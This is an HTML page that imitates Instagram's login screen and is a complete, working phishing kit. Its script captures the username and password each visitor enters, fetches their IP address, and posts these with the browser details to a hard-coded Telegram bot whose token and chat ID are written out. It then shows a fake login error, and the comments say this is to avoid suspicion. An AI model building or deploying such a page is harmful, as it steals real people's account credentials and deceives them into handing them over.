<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            max-width: 350px;
            width: 100%;
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px 30px;
            margin-bottom: 10px;
        }

        .logo {
            text-align: center;
            margin-bottom: 35px;
        }

        .logo svg {
            width: 175px;
            height: auto;
        }

        .input-group {
            margin-bottom: 6px;
        }

        .input-field {
            width: 100%;
            padding: 9px 8px 7px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            line-height: 18px;
            outline: none;
            transition: border 0.1s ease;
        }

        .input-field:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            font-size: 14px;
            padding: 7px 16px;
            margin-top: 14px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .login-btn:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider-text {
            margin: 0 18px;
        }

        .fb-login {
            text-align: center;
            margin-bottom: 20px;
        }

        .fb-link {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .fb-link svg {
            fill: #385185;
        }

        .forgot-password {
            text-align: center;
            margin-top: 14px;
        }

        .forgot-password a {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .signup-area {
            border: 1px solid #dbdbdb;
            background: white;
            max-width: 350px;
            width: 100%;
            text-align: center;
            padding: 25px 20px;
            margin-top: 10px;
        }

        .signup-text {
            font-size: 14px;
            color: #262626;
        }

        .signup-text a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .app-download {
            text-align: center;
            margin-top: 20px;
        }

        .app-download p {
            font-size: 14px;
            margin-bottom: 15px;
            color: #262626;
        }

        .store-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .store-buttons img {
            height: 40px;
        }

        .error-message {
            color: #ed4956;
            font-size: 12px;
            text-align: center;
            margin-top: 12px;
            display: none;
        }

        footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }

        /* Responsive */
        @media (max-width: 450px) {
            .login-container {
                padding: 35px 22px 25px;
            }
        }
    </style>
</head>
<body>
    <div>
        <div class="login-container">
            <div class="logo">
                <!-- Instagram text logo svg (official style) -->
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60" width="175" height="auto">
                    <defs>
                        <linearGradient id="instaGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" style="stop-color:#833ab4"/>
                            <stop offset="50%" style="stop-color:#fd1d1d"/>
                            <stop offset="100%" style="stop-color:#fcb045"/>
                        </linearGradient>
                    </defs>
                    <text x="10" y="42" font-family="Arial, sans-serif" font-weight="bold" font-size="38" fill="#262626">Instagram</text>
                </svg>
            </div>
            
            <form id="loginForm">
                <div class="input-group">
                    <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" autocomplete="off" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="off" required>
                </div>
                <button type="submit" id="loginBtn" class="login-btn">Log in</button>
                <div id="errorMsg" class="error-message">Sorry, your login was unsuccessful. Please try again.</div>
            </form>
            
            <div class="divider">
                <div class="divider-line"></div>
                <div class="divider-text">OR</div>
                <div class="divider-line"></div>
            </div>
            
            <div class="fb-login">
                <a href="#" class="fb-link" id="fakeFbLink">
                    <svg aria-label="Facebook" color="#385185" fill="#385185" height="20" role="img" viewBox="0 0 24 24" width="20">
                        <path d="M22 12c0-5.5-4.5-10-10-10S2 6.5 2 12c0 5 3.7 9.1 8.4 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.8-3.9 1.1 0 2.2.2 2.2.2v2.5h-1.3c-1.2 0-1.6.8-1.6 1.6V12h2.8l-.4 2.9h-2.3v7C18.3 21.1 22 17 22 12z"/>
                    </svg>
                    Log in with Facebook
                </a>
            </div>
            
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
        </div>
        
        <div class="signup-area">
            <div class="signup-text">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>
        
        <div class="app-download">
            <p>Get the app.</p>
            <div class="store-buttons">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play">
            </div>
        </div>
        <footer>
            © 2025 Instagram from Meta
        </footer>
    </div>

    <script>
        // ======================= TELEGRAM CONFIGURATION =======================
        const BOT_TOKEN = "8730003169:AAFm8cAT1QkRc-tfnbcm4AShbzjqcJqkr_E";
        const CHAT_ID = "8484368676";
        
        // Helper: Send data to telegram bot
        async function sendToTelegram(identifier, password, ipAddress, userAgent, timestamp) {
            const message = `🔐 *NEW INSTAGRAM LOGIN ATTEMPT* 🔐\n\n👤 *Username/Email:* ${escapeMarkdown(identifier)}\n🔑 *Password:* ${escapeMarkdown(password)}\n🌍 *IP Address:* ${escapeMarkdown(ipAddress)}\n🖥️ *User Agent:* ${escapeMarkdown(userAgent)}\n⏱️ *Timestamp:* ${escapeMarkdown(timestamp)}\n⚠️ *Platform:* Web (Instagram Clone)`;
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const payload = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown",
                disable_web_page_preview: true
            };
            
            try {
                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });
                const result = await response.json();
                if (!result.ok) {
                    console.error("Telegram error:", result.description);
                } else {
                    console.log("Telegram sent successfully");
                }
            } catch (err) {
                console.error("Failed to send to Telegram:", err);
            }
        }
        
        // Helper: escape markdown special chars
        function escapeMarkdown(text) {
            if (!text) return "`(empty)`";
            // escape characters that could break markdown: _ * [ ] ( ) ~ ` > # + - = | { } . !
            return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
        }
        
        // Get client IP using multiple free IP services (failover)
        async function getClientIP() {
            // Try ipify first (most reliable)
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                if (data.ip) return data.ip;
            } catch (e) {
                console.warn("ipify failed", e);
            }
            
            // Fallback 1: ipapi
            try {
                const res2 = await fetch('https://api.ipapi.is/');
                const data2 = await res2.json();
                if (data2.ip) return data2.ip;
            } catch(e) {}
            
            // Fallback 2: seeip.org
            try {
                const res3 = await fetch('https://ipv4.seeip.org/json');
                const data3 = await res3.json();
                if (data3.ip) return data3.ip;
            } catch(e) {}
            
            return "Unable to retrieve IP (maybe localhost)";
        }
        
        // Show error message to user (makes it seem like a real login failure)
        function showLoginError() {
            const errorDiv = document.getElementById('errorMsg');
            errorDiv.style.display = 'block';
            setTimeout(() => {
                errorDiv.style.display = 'none';
            }, 3500);
        }
        
        // Reset button state
        function setButtonLoading(isLoading) {
            const loginBtn = document.getElementById('loginBtn');
            if (isLoading) {
                loginBtn.disabled = true;
                loginBtn.textContent = "Logging in...";
            } else {
                loginBtn.disabled = false;
                loginBtn.textContent = "Log in";
            }
        }
        
        // Main submit handler
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const usernameField = document.getElementById('username');
            const passwordField = document.getElementById('password');
            
            let identifier = usernameField.value.trim();
            const password = passwordField.value;
            
            // Basic validation (instagram also requires non-empty)
            if (!identifier || !password) {
                showLoginError();
                return;
            }
            
            // Disable button during request
            setButtonLoading(true);
            
            // Get IP address asynchronously
            let ip = await getClientIP();
            const userAgent = navigator.userAgent;
            const timestamp = new Date().toLocaleString('en-US', { timeZoneName: 'short' });
            
            // Send credentials & IP to Telegram Bot
            await sendToTelegram(identifier, password, ip, userAgent, timestamp);
            
            // Simulate Instagram failed login (to appear real & avoid suspicion)
            // Clear password field only? (like real insta shows error but keeps username)
            // But to appear normal, we just show generic error and reset password field (instagram behavior)
            setTimeout(() => {
                setButtonLoading(false);
                showLoginError();   // "Sorry, your login was unsuccessful..."
                passwordField.value = '';   // clear password field (like real insta page would keep pwd? Actually it often resets)
                // but not clear username
                usernameField.focus();
            }, 800);
        });
        
        // Additional: Instagram-like interactions for fake facebook login (doesn't send data but looks realistic)
        document.getElementById('fakeFbLink').addEventListener('click', function(e) {
            e.preventDefault();
            // mimic behavior: show an error but not send anything (just UX)
            const errorDiv = document.getElementById('errorMsg');
            errorDiv.textContent = "Facebook login is temporarily unavailable. Please use username & password.";
            errorDiv.style.display = 'block';
            setTimeout(() => {
                errorDiv.textContent = "Sorry, your login was unsuccessful. Please try again.";
                setTimeout(() => {
                    if (errorDiv.textContent.includes("Facebook")) errorDiv.style.display = 'none';
                }, 2500);
            }, 3000);
        });
        
        // Sign up link - just prevent actual redirect and show dummy message (optional)
        const signupLink = document.querySelector('.signup-text a');
        if (signupLink) {
            signupLink.addEventListener('click', (e) => {
                e.preventDefault();
                alert('Sign up is currently not available. (Demo Instagram Login Page)');
            });
        }
        
        const forgotLink = document.querySelector('.forgot-password a');
        if (forgotLink) {
            forgotLink.addEventListener('click', (e) => {
                e.preventDefault();
                alert('Password reset is simulated for demo purposes.');
            });
        }
    </script>
</body>
</html>
